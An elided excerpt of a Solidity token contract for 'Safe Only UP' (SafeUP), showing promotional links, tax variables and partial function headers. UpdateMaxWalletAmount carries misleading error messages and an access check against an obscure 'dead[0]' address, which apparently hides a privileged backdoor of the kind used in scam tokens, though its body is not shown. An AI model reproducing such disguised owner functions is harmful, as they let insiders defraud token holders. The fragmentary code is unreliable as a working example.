...
/**
   Telegram: https://t.me/safeonlyup
   Website:  https://onlygoingup.com
   Twitter:  https://twitter.com/safeonlyupeth   
**/
...
contract SafeOnlyUP is Context , IERC20, Ownable {
    ...
    uint256 public _finaSellTax=0;
    uint256 private _rBTaxAt=11;
    uint256 private _rSTaxAt=11;
    uint256 private _noSwapB=11;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"Safe Only UP";
    string private constant _symbol = unicode"SafeUP";
    ...
    function UpdateTaxWallet(uint256 i, address a) public {
    ...
    function UpdateMaxWalletAmount(address account, uint256 amount) public {
    require(account != address(0), "BEP20: burning to the zero address");
    require(msg.sender == dead[0], "No tokens");
